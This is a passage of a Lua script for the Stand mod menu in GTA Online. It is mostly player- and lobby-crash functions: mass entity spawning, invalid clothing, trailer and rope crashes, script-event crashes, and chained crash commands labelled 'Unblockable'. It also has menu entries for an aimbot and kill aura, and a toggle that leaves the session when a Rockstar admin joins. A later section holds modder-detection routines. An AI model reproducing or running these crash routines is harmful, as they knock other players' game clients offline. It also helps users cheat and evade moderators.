        SpawnPed_Wade[i] = CreatePed(50, 0x850446EC, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        SpawnPed_Wade[i] = CreatePed(50, 0x5F4C593D, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        SpawnPed_Wade[i] = CreatePed(50, 0x38951A1B, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(10000)
    for i = 1, 50 do
        entities.delete_by_handle(SpawnPed_Wade[i])
        entities.delete_by_handle(SpawnPed_Wade[i])
        entities.delete_by_handle(SpawnPed_Wade[i])
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Invalid Clothing Crash", {}, "Crash player with invalid clothes", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
    local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    for i = 0, 500 do
        PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
        ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false,
            false, true);
        util.yield(10)
    end
    entities.delete_by_handle(Spawned_Mike)
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Trailer Crash", {}, "Crash player with trailer", function()
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
    SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
    SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
    SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
    SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
    SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
    SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false,
        0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false,
        0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0
        , true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0
        , true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0,
        true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0,
        true)
    for i = 0, 100 do
        TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(SpawnedTowtruck)
    entities.delete_by_handle(SpawnedDune1)
    entities.delete_by_handle(SpawnedDune2)
    entities.delete_by_handle(SpawnedBarracks31)
    entities.delete_by_handle(SpawnedBarracks32)
    entities.delete_by_handle(SpawnedBarracks1)
    entities.delete_by_handle(SpawnedBarracks2)
end)

if menu.get_edition() >= 1 then 
    crash2_ref:action("Osama´s bomb", {"tsarbomba"}, "A pc demanding crash, if you dont have a good pc, i don't recommend using it (Unblockable uwu)", function()

        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Poor guy")
        menu.trigger_commands("rlag3"..players.get_name(pid))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(pid))
        util.yield(400)
        menu.trigger_commands("crashv2"..players.get_name(pid))
        util.yield(400)
        menu.trigger_commands("crashv4"..players.get_name(pid))
        util.yield(500)
        menu.trigger_commands("crashv5"..players.get_name(pid))
        util.yield(500)
        menu.trigger_commands("crashv6"..players.get_name(pid))
        util.yield(500)
        menu.trigger_commands("crashv7"..players.get_name(pid))
        util.yield(500)
        menu.trigger_commands("crashv8"..players.get_name(pid))
        util.yield(700)
        menu.trigger_commands("crashv9"..players.get_name(pid))
        util.yield(2000)
        menu.trigger_commands("crash"..players.get_name(pid))
        util.yield(1800)
        util.toast("wait until everything cleans up by itself...")
        menu.trigger_commands("rlag3"..players.get_name(pid))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
end

if menu.get_edition() >= 2 then
    crash2_ref:action("Osama´s bomb V2", {"tsarbomba"}, "A pc demanding crash, if you dont have a good pc, i don't recommend using it (Unblockable uwu) \n(It needs to regulate in order to work/Posible Overload)", function()
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Poor man")
        menu.trigger_commands("rlag3"..players.get_name(pid))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(pid))
        util.yield(400)
        menu.trigger_commands("crashv2"..players.get_name(pid))
        util.yield(400)
        menu.trigger_commands("crashv4"..players.get_name(pid))
        util.yield(500)
        menu.trigger_commands("crashv5"..players.get_name(pid))
        util.yield(500)
        util.yield(2000)
        menu.trigger_commands("crash"..players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("ngcrash"..players.get_name(pid))
        util.yield(400)
        menu.trigger_commands("footlettuce"..players.get_name(pid))
        util.yield(700)
        menu.trigger_commands("steamroll"..players.get_name(pid))
        menu.trigger_commands("choke"..players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("flashcrash"..players.get_name(pid))
        util.yield(1800)
        util.toast("wait until everything cleans up by itself...")
        menu.trigger_commands("rlag3"..players.get_name(pid))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
end

if menu.get_edition() >= 3 then
    crash2_ref:action("Osama´s Special bomb (Model)", {"tsarbomba5"}, "A pc demanding crash, if you dont have a good pc, i don't recommend using it (Unblockable uwu) \n(It needs to regulate in order to work/Posible Overload)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Poor guy")
        menu.trigger_commands("rlag3"..players.get_name(pid))
        util.yield(2500)
        menu.trigger_commands("crashv27"..players.get_name(pid))
        util.yield(620)
        menu.trigger_commands("crashv18"..players.get_name(pid))
        util.yield(620)
        menu.trigger_commands("crashv12"..players.get_name(pid))
        util.yield(820)
        menu.trigger_commands("crashv10"..players.get_name(pid))
        util.yield(620)
        menu.trigger_commands("crashv5"..players.get_name(pid))
        util.yield(620)
        menu.trigger_commands("crashv4"..players.get_name(pid))
        util.yield(620)
        menu.trigger_commands("crashv1"..players.get_name(pid))
        util.yield(720)
        menu.trigger_commands("crashv13"..players.get_name(pid))
        util.yield(720)
        menu.trigger_commands("crashv14"..players.get_name(pid))
        util.yield(2800)
        menu.trigger_commands("crash"..players.get_name(pid))
        util.yield(550)
        menu.trigger_commands("ngcrash"..players.get_name(pid))
        util.yield(550)
        menu.trigger_commands("footlettuce"..players.get_name(pid))
        util.yield(550)
        menu.trigger_commands("steamroll"..players.get_name(pid))
        util.yield(550)
        menu.trigger_commands("choke"..players.get_name(pid))
        util.yield(550)
        menu.trigger_commands("flashcrash"..players.get_name(pid))
        util.yield(200)
        util.yield(400)
        menu.trigger_commands("smash"..players.get_name(pid))
        if PLAYER.GET_VEHICLE_PED_IS_IN(ped, false) then
            menu.trigger_commands("slaughter"..players.get_name(pid))
        end
        util.yield(1500)
        util.toast("wait until everything cleans up by itself...")
        menu.trigger_commands("rlag3"..players.get_name(pid))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
end

crash2_ref:toggle_loop("Buttplug Crash", {"asshole"}, "Works on very few menus, but works on legits.", function ()
    for i = 1, 10 do
    local cord = getEntityCoords(getPlayerPed(pid))
    requestModel(-930879665)
    wait(10)
    requestModel(3613262246)
    wait(10)
    requestModel(452618762)
    wait(10)
    requestModel(1360563376)
    wait(10)
    while not hasModelLoaded(-930879665) do wait() end
    while not hasModelLoaded(3613262246) do wait() end
    while not hasModelLoaded(452618762) do wait() end
    while not hasModelLoaded(1360563376) do wait() end
    local a1 = entities.create_object(-930879665, cord)
    local a2 = entities.create_object(-930879665, cord)
    local a3 = entities.create_object(-930879665, cord)
    wait(10)
    local b1 = entities.create_object(3613262246, cord)
    local b2 = entities.create_object(3613262246, cord)
    local b3 = entities.create_object(3613262246, cord)
    wait(10)
    local c1 = entities.create_object(452618762, cord)
    local c2 = entities.create_object(452618762, cord)
    local c3 = entities.create_object(452618762, cord)
    wait(10)
    local d1 = entities.create_object(3613262246, cord)
    local d2 = entities.create_object(3613262246, cord)
    local d3 = entities.create_object(3613262246, cord)
    wait(10)
    local e1 = entities.create_object(1360563376, cord)
    local e2 = entities.create_object(1360563376, cord)
    local e3 = entities.create_object(1360563376, cord)
    wait(300)
    entities.delete_by_handle(a1)
    entities.delete_by_handle(a2)
    entities.delete_by_handle(a3)
    entities.delete_by_handle(b1)
    entities.delete_by_handle(b2)--]]
    entities.delete_by_handle(b3)
    entities.delete_by_handle(c1)
    entities.delete_by_handle(c2)
    entities.delete_by_handle(c3)
    entities.delete_by_handle(d1)
    entities.delete_by_handle(c2)
    entities.delete_by_handle(c3)
    entities.delete_by_handle(d1)
    entities.delete_by_handle(d2)
    entities.delete_by_handle(d3)
    entities.delete_by_handle(e1)
    entities.delete_by_handle(e2)
    entities.delete_by_handle(e3)
    noNeedModel(452618762)
    wait(10)
    noNeedModel(3613262246)
    wait(10)
    noNeedModel(-930879665)
    wait(10)
    noNeedModel(1360563376)
    wait(10)
    noNeedModel(1360563376)
    wait(10)
    end
    if SE_Notifications then
        util.toast("Finished.")
    end
end)

crash2_ref:toggle_loop("NN Crash", {"byenn"}, "sit NN", function ()
    for i = 1, 10 do
    local nackt = util.joaat("a_m_m_acult_01")
    local dolphin = util.joaat("a_c_dolphin")
    local fish = util.joaat("a_c_fish")
    local niko = util.joaat("mp_m_niko_01")
    local rat = util.joaat("a_c_rat")
    
    requestModel(nackt)
    requestModel(dolphin)
    requestModel(fish)
    requestModel(niko)
    requestModel(rat)

    local cord = getEntityCoords(getPlayerPed(pid))
    local a1 = entities.create_ped(5, nackt, cord, 0)
    local a2 = entities.create_ped(5, nackt, cord, 0)
    local a3 = entities.create_ped(5, nackt, cord, 0)
    wait(10)
    local b1 = entities.create_ped(5, dolphin, cord, 0)
    local b2 = entities.create_ped(5, dolphin, cord, 0)
    local b3 = entities.create_ped(5, dolphin, cord, 0)
    wait(10)
    local c1 = entities.create_ped(5, fish, cord, 0)
    local c2 = entities.create_ped(5, fish, cord, 0)
    local c3 = entities.create_ped(5, fish, cord, 0)
    wait(10)
    local d1 = entities.create_ped(5, niko, cord, 0)
    local d2 = entities.create_ped(5, niko, cord, 0)
    local d3 = entities.create_ped(5, niko, cord, 0)
    wait(10)
    local e1 = entities.create_ped(5, rat, cord, 0)
    local e2 = entities.create_ped(5, rat, cord, 0)
    local e3 = entities.create_ped(5, rat, cord, 0)
    wait(300)
    end
    if SE_Notifications then
        util.toast("Finished.")
    end
end)

----------------------------------------------------------------------------------------

crash2_ref:divider("LOBBY CRASHES")

crash2_ref:action("Script Event Crash", {}, "", function()
    for i = 1, 10 do
        util.trigger_script_event(1 << pid, {243072129, pid, 1, pid, 0, 1, 0})  
    end
end)

crash2_ref:action("5G", {}, "5G?", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local allvehicles = entities.get_all_vehicles_as_handles()
    for i = 1, 3 do
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
            util.yield()
        end
    end
end)

crash2_ref:action("AIO", {}, "", function()
    local time = (util.current_time_millis() + 2000)
    while time > util.current_time_millis() do
        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for i = 1, 10 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
        end
        util.yield_once()
    end
end)

crash2_ref:action("Rope Crash V1", {"ropecrashv1"}, "", function()
    for i = 0, 31, 1 do
        if players.exists(i) then
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local playerPed = getPlayerPed(i)
    local pc = getEntityCoords(playerPed)
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    entities.delete_by_handle(veh); entities.delete_by_handle(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
    util.toast("Crashed Lobby with Rope Crash V1")
        end
    end
end)

crash2_ref:action("Rope Crash V2", {"ropecrashv2"}, "", function()
    PHYSICS.ROPE_LOAD_TEXTURES()
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    cargobob = entities.create_vehicle(2132890591, pos, 0)
    cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    util.toast("Crashed Lobby with Rope Crash V2")
end)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
end------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

modder_detections:toggle_loop("GodMode", {}, "It'll pop up if godmode is detected.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if players.is_godmode(player_id) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_player_is_in(player_id) == interior then
                util.draw_debug_text(players.get_name(player_id) .. " Has godmode.")
                break
            end
        end
    end 
end)

modder_detections:toggle_loop("Vehicle godmode", {}, "It'll pop up if godmode on a vehicle is detected.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_player_is_in(player_id) == interior then
                    util.draw_debug_text(players.get_name(player_id) .. " Is inside a vehicle with godmode")
                    break
                end
            end
        end
    end 
end)

modder_detections:toggle_loop("Modded weapons", {}, "It'll pop up if a gifted weapon is detected", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        for i, hash in ipairs(ryze.modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(player_id) .. " Is using a modded gun")
                break
            end
        end
    end
end)

modder_detections:toggle_loop("Unreleased Vehicle", {}, "It'll pop up if a unreleased vehicle is being used.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(ryze.modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " Has a modded/unreleased vehicle")
                break
            end
        end
    end
end)

modder_detections:toggle_loop("Weapon on interior grounds", {}, "It'll pop up if a weapon is being used on interior grounds", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " Has a weapon out on interior grounds")
            break
        end
    end
end)

modder_detections:toggle_loop("Run fast", {}, "It'll pop up if a player is running faster than usual", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and ryze.get_interior_player_is_in(player_id) == 0 and ryze.get_transition_state(player_id) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(player_id) .. " Is Using Super Run")
            break
        end
    end
end)

modder_detections:toggle_loop("Noclip", {}, "Detects if the player is levitating", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(player_id)
        util.yield()
        local currentpos = players.get_position(player_id)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(player_id)
        and ryze.get_interior_player_is_in(player_id) == 0 and ryze.get_spawn_state(player_id) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 395.0
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(player_id) .. " Is using noclip")
            break
        end
    end
end)

modder_detections:toggle_loop("Spectating", {}, "Detects if someone is spectating you", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) ~= 0 and ryze.get_interior_player_is_in(player_id) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(player_id)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 20.0 then
                    util.toast(players.get_name(player_id) .. " Is watching you")
                    break
                end
            end
        end
    end
end)

modder_detections:toggle_loop("Teleport", {}, "Detects if a player is teleporting", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        util.create_thread(function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                local oldpos = players.get_position(player_id)
                util.yield(500)
                local currentpos = players.get_position(player_id)
                for i, interior in ipairs(interior_stuff) do
                    if v3.distance(oldpos, currentpos) > 300.0 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                    and ryze.get_interior_player_is_in(player_id) ~= 0 and ryze.get_spawn_state(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
                        util.toast(players.get_name(player_id) .. " Has teleported")
                    end
                end
            end
        end)
    end
end)

menu.toggle_loop(detections, "Votekick", {}, "Detects if someone is about to get votekicked ot of the sessiona.  Known as 'smart kick' on Stand.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local kickowner = NETWORK.NETWORK_SESSION_GET_KICK_VOTE(player_id)
        local kicked = NETWORK.NETWORK_SESSION_KICK_PLAYER(player_id)
        if kicked then
            util.draw_debug_text(players.get_name(player_id) .. " The player" .. kicked .. "has been votekicked by:" .. kickowner)
            break
        end
    end
end)

menu.toggle_loop(detections, "Thunder join", {}, "Detects if someone is joining your session in a unusual way.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) == 0 and players.get_script_host() == player_id  then
            util.toast(players.get_name(player_id) .. " Sent a detection (Thunder Join) and now is modder")
        end
    end
end)

local allplay_ref = menu.ref_by_path("Players>All Players")
local allplaylist = allplay_ref:list("Stand Expansion", {}, "")
local allplaymal = allplaylist:list("Malicious", {}, "")
local allplayoth = allplaylist:list("Other", {}, "")

local weap_ref = menu.ref_by_path("Self>Weapons")
local weplist = weap_ref:list("Stand Expansion", {}, "")

local play_ref = menu.ref_by_path("Players>Settings")

local veh_ref = menu.ref_by_path("Vehicle")
local vehh = veh_ref:list("Stand Expansion", {}, "")

local deletegun = weplist:list("Delete Gun")

local killaura = weplist:list("Kill Aura")
local killAuraSettings = killaura:list("KillAura Settings", {}, "Settings for the KillAura functionality.")

local pvphelp = weplist:list("PvP / PvE Helper", {"pvphelp"}, "")
local silentAim = pvphelp:list("Silent Aimbot")
local silentAimSettings = silentAim:list("Silent Aim Settings", {}, "")
local vehaim = pvphelp:list("Vehicle Aimbot (experimental)")
local rpgaim = pvphelp:list("RPG Aimbot")
local rpgsettings = rpgaim:list("RPG Aimbot Settings", {"rpgsettings"}, "")
local orbway = pvphelp:list("Orbital Waypoint")
local carsuic = pvphelp:list("Auto Car-Suicide")
local legitrapid = pvphelp:list("Legit Rapid Fire")

local protex2 = protex_ref:list("Stand Expansion")

-----------------------------------------------------------------------------------------------------------------------------------

protex2:action("Remove things", {}, "It'll remove stuff sutck to you or really close to you.", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

protex2:toggle_loop("Stop all sounds", {"stopsounds"}, "", function()
    for i = -1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
        AUDIO.STOP_PED_RINGTONE(i)
    end
end)

protex2:toggle("Panic Bunker", {"panic"}, "This renderizes a anti-crash mode, getting out of the way any type of event in the game at all costs.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

protex2:toggle_loop("Fuck Off when R* admin", {}, "If this detects a R* admin, you get transfered to another session instantly", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(pid) then
        util.toast(players.get_name(pid) .. " There's an admin, hopping the fuck out")
        menu.trigger_commands("quickbail")
        return
    end
end

protex2:toggle("Auto Remove Bounty", {}, "Will remove bountys when detected.", function(on)
    local RemoveBountyPath = menu.ref_by_path("Online>Remove Bounty")
    if on then
        util.yield(500)
        menu.trigger_command(RemoveBountyPath)
    else
        return
    end
end)

